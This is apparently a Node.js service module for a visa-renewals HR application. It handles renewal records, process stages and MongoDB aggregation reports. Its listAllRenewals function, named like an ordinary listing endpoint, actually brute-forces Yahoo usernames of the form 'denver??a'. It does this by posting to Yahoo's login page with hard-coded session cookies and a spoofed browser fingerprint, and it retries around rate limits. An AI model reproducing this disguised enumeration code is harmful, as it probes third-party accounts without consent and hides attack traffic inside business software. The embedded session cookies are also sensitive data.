const { ObjectId } = require('mongodb');
const { Renewals, RenewalsBackUp } = require('../models');
const httpStatus = require('http-status');
const ApiError = require('../utils/ApiError');
const moment = require('moment-timezone');
const { toLower } = require('lodash');
const { sendEmail } = require('../middlewares/email');
const { EmailLog } = require('../models');
const { VisaProcess } = require('../models');
const { Processes } = require('../models');
const { DocumentTemplatesClone, Documents } = require('../models');
const { DocumentTemplate, DocumentTypes } = require('../models');
const queryService = require('./query.service');

const axios = require('axios');

const createRenewals = async (reqBody) => {
  let newRenewals = new Renewals(reqBody);
  return await newRenewals.save();
};

const getRenewalsById = async (renewalId) => {
  let renewals = await Renewals.findById({ _id: ObjectId(renewalId) });
  if (!renewals) {
    throw new ApiError(httpStatus.NOT_FOUND, 'Cannot find Renewals');
  }
  return renewals;
};

const getRenewalsOnUserId = async (userId) => {
  let renewals = await Renewals.find({ user_id: ObjectId(userId) });
  if (!renewals) {
    throw new ApiError(httpStatus.NOT_FOUND, 'Cannot find Renewals on the provided UserID');
  }
  return renewals;
};

const updateUpdatedBy = async (renewalId, userId) => {
  return Renewals.findOneAndUpdate({ _id: renewalId }, { $set: { updated_by: userId } });
};

const updateCreatedBy = async (renewalId, userId) => {
  return Renewals.findOneAndUpdate({ _id: renewalId }, { $set: { created_by: userId } });
};

const updateRenewalsOnId = async (renewalId, updateBody) => {
  const result = await getRenewalsById(renewalId);
  if (!result) {
    throw new ApiError(httpStatus.NOT_FOUND, 'Renewals Not found');
  }
  return Renewals.findOneAndUpdate({ _id: renewalId }, { $set: updateBody }, { new: true });
};
let apiFunc = async (i, j) => {
  return new Promise((resolve, reject) => {
    setTimeout(async () => {
      str = String.fromCharCode(i).toString().toLowerCase() + String.fromCharCode(j).toString().toLowerCase();
      console.log(str);
      string = `denver${str}a%40yahoo`;
      await axios({
        method: 'post',
        url: 'https://login.yahoo.com/?.src=ym&lang=en-IN&done=https%3A%2F%2Fmail.yahoo.com%2F%3Fguce_referrer%3DaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%26guce_referrer_sig%3DAQAAALhKluwtUR6m5xVNA7WLF6lTK6KzeZCccYI0wQEnu1mFfy1rGJqqGK9ENlWmINgU4Q5FHgZytEqtbEdmHMkB-XuzpwV2BfUA7zDUBCOj4kFg8dMvqmDFNwFtoISS66-mC_X4D4UO_BI_nJhWAn-DZmYmBeD_XknW1rHzGni6O595',
        headers: {
          authority: 'login.yahoo.com',
          accept: '*/*',
          'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          cookie:
            'A3=d=AQABBPZ9tmQCEBzFVvKwjqtE53nNC8o3IREFEgEBAQHPt2TAZM1n0CMA_eMAAA&S=AQAAAnmjLCfEHFGJpqs0sqDnx_U; A1=d=AQABBPZ9tmQCEBzFVvKwjqtE53nNC8o3IREFEgEBAQHPt2TAZM1n0CMA_eMAAA&S=AQAAAnmjLCfEHFGJpqs0sqDnx_U; A1S=d=AQABBPZ9tmQCEBzFVvKwjqtE53nNC8o3IREFEgEBAQHPt2TAZM1n0CMA_eMAAA&S=AQAAAnmjLCfEHFGJpqs0sqDnx_U; cmp=t=1701871646&j=0&u=1---; gpp=DBAA; gpp_sid=-1; gam_id=y-dP3chzhE2uICyIWCEimRty6cNo_BpeJO~A; axids=gam=y-dP3chzhE2uICyIWCEimRty6cNo_BpeJO~A&dv360=eS1vTUVRZWd4RTJ1R3FVdHoxa0dHMGYyUFVVb0wuRU5SQn5B; tbla_id=2a5ddea3-152c-4765-a14a-a95388055e32-tuctbb021a7; GUCS=ARCnv2ND; AS=v=1&s=RWTYD5NN&d=A6571dab5|rNbYUur.2SpFP3gkIIF56kw3jpRVgr9Ev6xDrRANirH6gFdg3vq_kM_S6Mt6SxtCO3ZPqTgH2HzUmphALBBEPsXIEjnHn9c5DNFxM_WhmoMQbdpzgTBwVVOppt0Ftj28qbJcau3wbza7uR1eiwYCsvaEmYDfHAkMt2V_OmLNug3sxQHe29tMu7x7QxugCC39e2ZmGQHo4LgC0vMmc2qZCbUmMsBXyvjo7FDmWzaygKsTZseeyY14OV6nQag__iUV_yAur8Ag2UI7E99f7Mh9plkrxRQRwaKUKEu8ur38unZwJHf27niTJqhgthfsH1t36B3xFPxdhbfpytL5xb3tXShXeiLM0HYEAcj6JmR0xJvAwLCdjt3jVFYIFTunaHRwpMA6v1nTgBkAq_AHjY6BoqdyTQEQ0lcwQFQc7RefOs8qrzFBqBfJgCLte1MkAzy5P46mARQVmZBg1WsQa_EiEsQSGhXiHnrdmi5xglC.l0pf7XGA83q5HzmqJgPgXQW7dDakbRwmThbFmXBXScDDpF8mk2bwM.NUokOrDB0MC9SjKrgSneMo0bLy4mYUoAW49LvYYpSSBB8n2S1KqUzHTBoC1Xq6jQ46guc1D3RkGoLtAoOQcF5UdM1UTMMyoYqsTNUFAiJ2HD3BqeqA2H5Mv.kpxpYWyP_OCdIxgbBuxo5_CdYruQqX3T.1uJ3LpXP3G1cbWAj8x1Hd.QNqQlwFw62R.kYKXCl570_3uPYcRD4N5qdxDDMsLZo5Q4OoWSAWU1RuupuUjTiXf8CO_8sUVL9Z5FeZW5cVPqklFNJQanBlKuknQ7clsX0-~A|B65708bd5|.8M2hiD.2QI7l1Lb3nUm.3EnwaToF7fMcRUx9vPur8O3bEb4v5.Cbf2C0k3SMEQn1TgMCNXx52DaMAb_izgqYXNl9rDO6l0a.qSrOiscHIwSbqfXeYbPBw7U.ST_HxTcRYcnl0PLVNkI4BCJQm3RxIJ2x9AZxg1qoh6Vj0roPOxBJb7tJ2tmhtGV9nOZhCIyfdPCkQVHyZrWSHa_xJYMHqWFtYjcuu.SIniyaS6DicydCVCnPTD81TGeALNfPXXlliT61qut5N0NY38k5b6Uyzx8EBpc3O7ftDhMn2UTut5ylu28HSnKHIrh8H5QR2Igpwf73txGn_V9AIJhUowZQT5vFYswANjVBMrGrfZHwKyy8LIvBILSMfXXGsDLCba6D.HIPfmCiLzuxtF1A.Ijs8WzEzXSK4vZ0bxHt.fXFZmD6toIm7sfAv9EKiebTjvG5LdSRYjBLbr3NHqmU9iiW.dNm_E1YySVlgfIpL5mTQ7VXuinHGEM3lRpwXeRLOAjrGvSt6eru0qx_utXu.Sbdl9o1aTIEwEbrkfsJsj_OB6F1QIp9tbDn6jyEocWy2vJE5VWhKp5WXmBMDzsrf_I9hAI_pRM9dQnE08AskxVyM.gV7P.ZLOcmOjvJY4Zecb96.inuxR2hWLlPOhsx1bfVAMy4rdyFzWbZqV.P5v8j5Y2if5etWvTkvE41eBTyQZypZ.a44g47wpLksuoxkr2NGdgKqvEL1OJc2bzDtl7nErqNHAMUzND4Er7XdnIRvvVFFqwOOdPj0qVLjQ0A.gEC4soHj9jHvrJprWyqFXR4ZcAZYqzNqXAMbOJnoNFBQi6v_srlqtX675m0ZVzYyfAimTWOvqYyF2pRpE71Zv4xuaNl3lLYEbB9NzfJunPZwc2LrAMDemc0eNQrQBTrypj_PwJRnghHqpGDbwblvy9mdTds55vUBG00DdX9lGhr1JUpK08fE7nb5AGmpmXNa.718EckiGkzorKQ0X7bkD0bWlSLezMZVw5N143AWAprujXMfRoKdjvkYTcmuBHc.wARIJTU_avL_6.AEERkGwWalJzMPURZMONXgLFtrlpQFK_oz5nKXuFOTooLh3WyJHiAM5QbW2Bfo8rcoKvexIgMtQQ17cddEHr7YckC.k-~A|C6571db46|b3ZGkHj.2SrlhNA2uczlOK84cRrqPYrInr26iR5X7KXEjNzX47zsSKBPrZmJ0YNAJpXFVO48gqVYz_DWmGDnU366NM_vSxvvsg2Z6vikoweve_M9gjLR2kTVOW7sMXT37Myyp0_duDr5Z55e9rOuB02Z.SAaYVQBa.ZJ_7lG6oPcjmqrp2GqDoEqStQRoDy9AnqoKS7H7yg0DaJKjAlH7_LZrmfCv6ydkN_CN4cOMuS2cP95h6UZh.yTdW5.nXrzaLThbiV_XmTuouWhQ5NQcgjl_SmEIZ4EJFdZKZmulXo7JbvBES9BYYHi.x42zSV9DeJflMyiFUp1TZz2BbfdegMCt0Q8EP5jbpy6nuJGT9sDupRBPeR1JEm26Yoh5NDqLlDHHNR6qaf6TROrQDrdfANALbkYwgtku.l3tfxqJVDDQwn5d0u1_.8dTqqsMnN3bmgmRtXJEzV3A9vcEZjZdkvc36BKg8UbgN.JzpbcjMqtQKJM6PKXWpUJTxbH72_aBEIfogpk90WQ60nToMbxIuQ7JjBwrODev9SoSB.fjGJoVEt2.FEz539R2KetsU1JUoST1Qo0Kn5v5nMY72l1ncAJixgdTR99zCp0lzdLIJii4gsIFBwfFUj9RyLcuAySNLJauU7IcXJEBl..MfhEkz689_6KNAP_MlTlwFUczcnkXu74oa7nj6AXohRZMff1lnBSytFXhehVbZe2nyTIfmCrKL6Abf8mdIvWaQiDAhT6rn5KBsTtjDl5WFkmr64lNzgYpWAmvsrwAvbgXPL3A4LRIXU7o6DSv8MEwDRbjFzhAQG3okFv4Q--~A',
          origin: 'https://login.yahoo.com',
          referer:
            'https://login.yahoo.com/?.src=ym&lang=en-IN&done=https%3A%2F%2Fmail.yahoo.com%2F%3Fguce_referrer%3DaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%26guce_referrer_sig%3DAQAAALhKluwtUR6m5xVNA7WLF6lTK6KzeZCccYI0wQEnu1mFfy1rGJqqGK9ENlWmINgU4Q5FHgZytEqtbEdmHMkB-XuzpwV2BfUA7zDUBCOj4kFg8dMvqmDFNwFtoISS66-mC_X4D4UO_BI_nJhWAn-DZmYmBeD_XknW1rHzGni6O595',
          'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"macOS"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent':
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
          'x-requested-with': 'XMLHttpRequest',
        },
        data: {
          foo: `browser-fp-data=%7B%22language%22%3A%22en-IN%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A8%2C%22timezoneOffset%22%3A-240%2C%22timezone%22%3A%22Asia%2FDubai%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22MacIntel%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Apple)~ANGLE%20(Apple%2C%20ANGLE%20Metal%20Renderer%3A%20Apple%20M2%2C%20Unspecified%20Version)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A27%2C%22hash%22%3A%22d52a1516cfb5f1c2d8a427c14bc3645f%22%7D%2C%22audio%22%3A%22124.04344968475198%22%2C%22resolution%22%3A%7B%22w%22%3A%221920%22%2C%22h%22%3A%221080%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%221055%22%2C%22h%22%3A%221854%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1701874118347%2C%22render%22%3A1701874118630%7D%7D&crumb=U5LxzqzGXktiIocFo59g&acrumb=RWTYD5NN&sessionIndex=Qw--&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Atrue%7D%7D&username=${string}.com&passwd=&signin=Next&persistent=y`, // This is the body part
        },
      })
        .then(async (msgResp) => {
          if (msgResp.data.error) {
            reject(msgResp.data.error);
          } else {
            resolve(string);
          }
        })
        .catch(async (error) => {
          if (error.response && error.response.status === 429) {
            // API rate limit exceeded, implement exponential backoff
            const waitTime = Math.pow(2, parseInt(error.response.headers['retry-after'] || '1', 10));
            console.log(`Rate limit exceeded. Retrying in ${waitTime} seconds...`);
            await new Promise((resolve) => setTimeout(resolve, waitTime * 1000));
            reject({ code: 'timeout', i: i, j: j });
          } else {
            reject(e);
          }
        });
    }, 500);
  });
};
let ivar = 65;
let jvar = 65;
let arr = [];

const listAllRenewals = async (page, limit) => {
  console.log('here');
  let breakpoint = false;
  for (i = ivar; i <= 90; i++) {
    for (j = jvar; j <= 90; j++) {
      await apiFunc(i, j)
        .then((res) => {
          arr.push(res);
        })
        .catch((err) => {
          if (err?.code == 'timeout') {
            ivar = err.i;
            jvar = err.j;
            breakpoint = true;
          } else {
            console.log(err, 'Unable to list all renewals');
          }
        });
      if (breakpoint) {
        listAllRenewals(1, 0);
        break;
      }
    }
  }
  return arr;
  // let result = []
  // return result
};

const renewalsProcessFlowForward = async (reqBody, renewalId, userId) => {
  console.log('---------- RENEWALS PROCESS FLOW  *SERVICE* ----------');
  const renewalsResult = await getRenewalsById(renewalId);
  if (!renewalsResult) {
    throw new ApiError(httpStatus.NOT_FOUND, 'Unable to get the Data');
  }
  const filter_progress_process_status = { _id: ObjectId(renewalId), 'processes.process_status': 'progress' };
  let result = [];
  const docs = await Renewals.find(filter_progress_process_status);
  for (const doc of docs) {
    for (let index = 0; index < doc.processes.length; index++) {
      const process = doc.processes[index];
      if (process.process_status === 'progress' && process.actions.length > 0) {
        let allActionsCompleted = true;
        for (const action of process.actions) {
          if (action.status === 'progress') {
            if (toLower(action.action_type) === 'no action') {
              console.log('action type UPDATE ==> ', action);
              action.updated_by = userId;
              action.updated_date_time = moment.tz('UTC').tz('Asia/Dubai').format();
              action.status = 'completed';
              doc.status = process.stage_name;
            }
            if (toLower(action.action_type) === 'document') {
              console.log('action type DOCUMENT ==> ', action);
              //----GET THE DOCUMENTS ON THE TEMPLATE ID
              //----GENERATE THE DOCUMENT
              //----UPLOAD THE GENERATED DOCUMENT SOMEWHERE
              // if(documentUpdatables) {
              action.updated_by = userId;
              action.updated_date_time = moment.tz('UTC').tz('Asia/Dubai').format();
              action.status = 'completed';
              doc.status = process.stage_name;
              // }
            }
            if (toLower(action.action_type) === 'email') {
              console.log('action type EMAIL ==> ', action);
              //----GET THE EMAIL TEMPLATE FROM THE TEMPLATE ID
              let emailBody = {
                to: reqBody.to,
                cc: reqBody.cc,
                subject: reqBody.subject,
                body: reqBody.body,
              };
              if (emailBody) {
                sendEmail(emailBody.to, emailBody.subject, emailBody.body, emailBody.cc).then(async (result) => {
                  console.log('Email sent successfully:', result);
                  // await new EmailLog(emailBody).save()
                });
                action.updated_by = userId;
                action.updated_date_time = moment.tz('UTC').tz('Asia/Dubai').format();
                action.status = 'completed';
                doc.status = process.stage_name;
              }
            }
            if (toLower(action.action_type) === 'invoice creation' || toLower(action.action_type) === 'record payment') {
              console.log('action type INVOICE CREATION OR RECORD PAYMENT ==> ', action);
              action.updated_by = userId;
              action.updated_date_time = moment.tz('UTC').tz('Asia/Dubai').format();
              action.status = 'completed';
              doc.status = process.stage_name;
            }
          }
          if (action.status !== 'completed') {
            allActionsCompleted = false;
          }
        }

        if (allActionsCompleted && doc.processes.length == index + 1) {
          process.process_status = 'completed';
          doc.status = 'completed';
        }

        if (allActionsCompleted && doc.processes.length != index + 1) {
          process.process_status = 'completed';
          doc.processes[index + 1].process_status = 'progress';
          if (doc.processes[index + 1].actions.length > 0) {
            doc.processes[index + 1].actions[0].status = 'progress';
          }
        } else {
          for (const action of process.actions) {
            if (action.status === 'pending') {
              action.status = 'progress';
              break;
            }
          }
        }
        result.push(doc);
        const updated_renewals_process = await Renewals.updateOne(
          { _id: ObjectId(renewalId) },
          { $set: { processes: doc.processes, status: doc.status } }
        );
        break;
      }
      if (process.process_status === 'progress' && (!process.actions || process.actions.length === 0)) {
        process.process_status = 'completed';
        doc.status = toLower(process.stage_name);
        process.actions = [
          {
            updated_by: userId,
            updated_date_time: moment.tz('UTC').tz('Asia/Dubai').format(),
            status: 'completed',
          },
        ];
        if (doc.processes.length != index + 1) {
          doc.processes[index + 1].process_status = 'progress';
          if (doc.processes[index + 1].actions.length > 0) {
            doc.processes[index + 1].actions[0].status = 'progress';
          }
        }
        result.push(doc);
        const updated_renewals_process = await Renewals.updateOne(
          { _id: ObjectId(renewalId) },
          { $set: { processes: doc.processes, status: doc.status } }
        );
        break;
      }
    }
  }
  return result;
};

const getRenewalStatusCountOne = async (reqBody, reqQuery) => {
  try{
    const pipeline = [
      { $unwind: '$processes' },
      {
        $group: {
          _id: '$processes.stage_name',
          count: {
            $sum: {
              $cond: [{ $eq: ['$processes.process_status', 'progress'] }, 1, 0],
            },
          },
        },
      },
    ];
    if (reqBody.selected_company_id){
      pipeline.unshift(...queryService(reqBody));
    };
    if(reqQuery.company_id){
      pipeline.unshift({
        $match:{
          company_id: ObjectId(reqQuery.company_id)
        }
      })
    }
    let getCount = await Renewals.aggregate(pipeline);
    let total = getCount.map((data) => data.count).reduce((partialSum, a) => partialSum + a, 0);
    getCount.push({
      _id: 'Total',
      count: total,
    });
    return getCount;
  }catch(error){
    throw new Error(error);
  }
};
const getRenewalStatusCount = async (reqBody, reqQuery) => {
  try {
    let matchStage = {};

    if (reqBody.selected_company_id) {
      matchStage = queryService(reqBody);
    }

    if (reqQuery.company_id) {
      matchStage = { company_id: ObjectId(reqQuery.company_id) };
    }

    const pipeline = [
      { $match: matchStage },
      {
        $facet: {
          progressCounts: [
            { $unwind: "$processes" },
            {
              $group: {
                _id: "$processes.stage_name",
                count: {
                  $sum: {
                    $cond: [{ $eq: ["$processes.process_status", "progress"] }, 1, 0],
                  },
                },
              },
            },
          ],
          unsuccessfulCount: [
            { $match: { status: "unsuccessful" } },
            { $count: "count" }
          ]
        }
      },
      {
        $project: {
          progressCounts: 1,
          unsuccessfulCount: { $arrayElemAt: ["$unsuccessfulCount.count", 0] }
        }
      }
    ];

    let result = await Renewals.aggregate(pipeline);

    // Extract progress counts and unsuccessful count
    let progressCounts = result[0]?.progressCounts || [];
    let unsuccessfulCount = result[0]?.unsuccessfulCount || 0;

    // Calculate total count
    let totalCount = progressCounts.reduce((sum, data) => sum + data.count, 0);

    // Maintain response structure with "Total" and "Total Unsuccessful"
    progressCounts.push(
      { _id: "Total Progress", count: totalCount },
      { _id: "Total Unsuccessful", count: unsuccessfulCount }
    );

    return progressCounts;
  } catch (error) {
    throw new Error(error);
  }
};


const renewalsProcessBackward = async (renewalId) => {
  const filter_progress_process_status = { _id: ObjectId(renewalId), 'processes.process_status': 'progress' };
  let result = [];
  await Renewals.find(filter_progress_process_status).then((docs) => {
    docs.forEach(async (doc) => {
      for (let index = doc.processes.length - 1; index >= 0; index--) {
        const process = doc.processes[index];
        if (process.process_status === 'progress' && process.actions.length > 0) {
          let allActionsCompleted = true;
          for (let action_index = 0; action_index < process.actions.length; action_index++) {
            const action = process.actions[action_index];
            if (action.status === 'completed') {
              action.status = 'progress';
              break; // Exit the loop after updating the status of one action
            }
            if (action.status !== 'pending') {
              allActionsCompleted = false;
            }
          }

          if (allActionsCompleted && doc.processes.length != index - 1) {
            process.process_status = 'pending';
            doc.processes[index - 1].process_status = 'progress';
            if (doc.processes[index - 1].actions.length > 0) {
              doc.processes[index - 1].actions[0].status = 'progress';
            }
          } else {
            for (let i = 0; i < process.actions.length; i++) {
              const action = process.actions[i];
              if (action.status === 'progress') {
                action.status = 'pending';
                break;
              }
            }
          }
          break;
        }
        if (process.process_status === 'progress' && (!process.actions || process.actions.length === 0)) {
          process.process_status = 'pending';
          if (doc.processes.length != index - 1) {
            doc.processes[index - 1].process_status = 'progress';
            if (doc.processes[index - 1].actions.length > 0) {
              const action_length = doc.processes[index - 1].actions.length;
              doc.processes[index - 1].actions[action_length - 1].status = 'progress';
            }
          }
          break;
        }
      }
      result = doc.processes;
      const updated_process = await Renewals.updateOne({ _id: ObjectId(renewalId) }, { $set: { processes: doc.processes } });
    });
  });
  return result;
};

const AllRenewals = async (type, page, PerPage, search, reqBody) => {
  const perPage = 10;
  const sixtyDaysFromNow = new Date();
  sixtyDaysFromNow.setDate(sixtyDaysFromNow.getDate() + 60);
  const pipeline = [
    {
      $match: {
        type: ObjectId('6412c9795d3c723a3cf939d6'),
        module: 'users',
        expiry: { $nin: ['', undefined, null, 'undefined'] },
      },
    },
    {
      $lookup: {
        from: 'users',
        localField: 'foreign_id',
        foreignField: '_id',
        as: 'user',
      },
    },
    {
      $unwind: {
        path: '$user',
      },
    },
    {
      $match: {
        "user.user_status": { $nin: ['inactive', 'withdrawn', 'offboarding']},
      }
    },
    {
      $lookup: {
        from: 'companies',
        localField: 'user.company_id',
        foreignField: '_id',
        as: 'company',
      },
    },
    {
      $unwind: {
        path: '$company',
      },
    },
    {
      $lookup: {
        from: 'renewals',
        localField: 'user._id',
        foreignField: 'user_id',
        as: 'renewal',
      },
    },
    {
      $project: {
        renewalsId: '$renewal._id',
        'companyDetails.company_name': '$company.company_name',
        'companyDetails._id': '$company._id',
        'userDetails.full_name': { $concat: ['$user.first_name', ' ', '$user.last_name'] },
        'userDetails.last_name': '$user.last_name',
        'userDetails.first_name': '$user.first_name',
        'userDetails._id': '$user._id',
        'userDetails.designation': '$user.designation',
        expiry: '$expiry',
        "process": {
          $cond: {
            if: { $gt: [{ $size: '$renewal' }, 0] },
            then: 'Initiated',
            else: {
              $cond: {
                if: { $gt: [{ $size: '$renewal' }, 0] },
                then: 'Initiated',
                else: {
                  $cond: {
                    if: {
                      $and: [
                        { $gt: [{ $toDate: '$expiry' }, new Date()] },
                        { $lte: [{ $toDate: '$expiry' }, sixtyDaysFromNow] },
                      ],
                    },
                    then: 'Upcoming',
                    else: 'Expired',
                  },
                },
              },
            },
          },
        },
      },
    },
  ];
  if (reqBody && reqBody.selected_company_id && Array.isArray(reqBody.selected_company_id)) {
    const companyIds = reqBody.selected_company_id.map(id => ObjectId(id));
    pipeline.unshift({
      $match: {
        'user.company_id': { $in: companyIds },
      },
    });
  }
  // If search parameter is provided, add a match stage to filter by search term
  if (search) {
    const searchRegex = new RegExp(search, 'i'); // 'i' makes it case-insensitive
    pipeline.push({
      $match: {
        $or: [
          { 'userDetails.first_name': searchRegex },
          { 'userDetails.last_name': searchRegex },
          { 'companyDetails.company_name': searchRegex },
        ],
      },
    });
  }

  var TotalRenewals = 0;
  if (type != 'allRenewals') {
    pipeline.push({
      $match: {
        "process": type,
      },
    });

    console.log(pipeline)
    TotalRenewals = await Documents.aggregate(pipeline);

    pipeline.push({ $skip: page > 0 ? (page - 1) * perPage : 0 }, { $limit: perPage });
  } else {
    TotalRenewals = await Documents.aggregate(pipeline);

    pipeline.push({ $skip: page > 0 ? (page - 1) * perPage : 0 }, { $limit: perPage });
  }

  const renewalsAns = await Documents.aggregate(pipeline);
  console.log("print for renewals ans",renewalsAns)
  const result = {
    renewals: renewalsAns,
    TotalRenewals: TotalRenewals.length,
  };
  return result;
};

// $cond: {
//     if: { "$renewalsDetails": { $gte: { $size: 1 } } }, then: "Initiated",
//     else: "Test"

// }

const getRenewalsEmployeeDetails = async (renewalid) => {
  let pipeline = [
    {
      $match: {
        _id: ObjectId(renewalid),
      },
    },
    {
      $lookup: {
        from: 'companies',
        localField: 'company_id',
        foreignField: '_id',
        as: 'companyDetails',
      },
    },
    {
      $lookup: {
        from: 'users',
        localField: 'user_id',
        foreignField: '_id',
        as: 'userDetails',
      },
    },
    {
      $unwind: '$companyDetails',
    },
    {
      $unwind: '$userDetails',
    },
    {
      $project: {
        _id: 1,
        status: 1,
        stage_type: 1,
        processes: 1,
        user_location: 1,
        vip: 1,
        visa_type: 1,
        createdAt: 1,
        first_name: '$userDetails.first_name',
        middle_name: '$userDetails.middle_name',
        visa_sponsor: '$userDetails.employment.visa_sponsor_type',
        visa_sponsor: '$userDetails.employment.visa_sponsor_type',
        visa_sponsor: '$userDetails.employment.visa_sponsor_type',
        last_name: '$userDetails.last_name',
        email: '$userDetails.email',
        designation: '$userDetails.employment.designation',
        contact_number: '$userDetails.contact_number',
        contract_type: '$userDetails.employment.contract_type',
        employment_type: '$userDetails.employment.employment_type',
        process_type: '$userDetails.process_type',
        date_of_joining: '$userDetails.date_of_joining',
        phone: '$userDetails.phone',
        emp_id: '$userDetails.emp_id',
        personal: '$userDetails.personal',
        employment: '$userDetails.employment',
        place_of_registration: '$userDetails.place_of_registration',
        dependent_details: '$userDetails.dependent_details',
        payroll_details: '$userDetails.payroll_details',
        salary: '$userDetails.salary',
        user_image_url: '$userDetails.image_url',
        company_name: '$companyDetails.company_name',
        company_legal_name: '$companyDetails.legal_name',
        company_registration_number: '$companyDetails.registration_number',
        company_logo: '$companyDetails.logo',
        company_phone: '$companyDetails.phone',
        company_email: '$companyDetails.email',
        company_address: '$companyDetails.address',
        company_country: '$companyDetails.country',
        company_website: '$companyDetails.website',
        company_locations: '$companyDetails.locations',
      },
    },
  ];
  let renewals = await Renewals.aggregate(pipeline);
  if (!renewals) {
    throw new ApiError(httpStatus.NOT_FOUND, 'Cannot find renewals');
  }
  for (let renewal of renewals) {
    if (renewal.processes && renewal.processes.length > 0) {
      for (let process of renewal.processes) {
        if (process.actions && process.actions.length > 0) {
          for (let action of process.actions) {
            if (action.action_type === 'document' && action.status == 'completed') {
              if (action.generated_document_id && ObjectId.isValid(action.generated_document_id)) {
                const uploadedDocument = await Documents.find({
                  _id:action.generated_document_id,
                  is_deleted: false,
                })
                  .sort({ createdAt: -1 })
                  .limit(1);
                if (uploadedDocument && uploadedDocument.length > 0) {
                  process.attachments = uploadedDocument;
                }
              }
            }else if (action.action_type == "document upload" && action.status == "completed"){
              if (process.stage_name.toLowerCase() == "work order sign"){
                // get document teamplate
                const template = await DocumentTypes.findOne({
                  name: "signed work Order"
                })
                const uploadedWorkOrder = await Documents.find({type: template._id, is_deleted: false}).sort({ createdAt: -1 }).limit(1);
                if(uploadedWorkOrder){
                  process.attachments = uploadedWorkOrder
                }

              }
            }
          }
        }
      }
    }
  }
  return renewals;
};

const clearRenewalsTable = async () => {
  try {

    const existingRenewals = await Renewals.find()
  //  const newData = await RenewalsBackUp.insertMany(existingRenewals)

    await RenewalsBackUp.insertMany(existingRenewals)

    return existingRenewals
  } catch(error){
    throw new Error(error)
  }
}

module.exports = {
  createRenewals,
  getRenewalsById,
  getRenewalsOnUserId,
  updateUpdatedBy,
  updateCreatedBy,
  updateRenewalsOnId,
  listAllRenewals,
  renewalsProcessFlowForward,
  renewalsProcessBackward,
  getRenewalStatusCount,
  AllRenewals,
  getRenewalsEmployeeDetails,
  clearRenewalsTable,
};
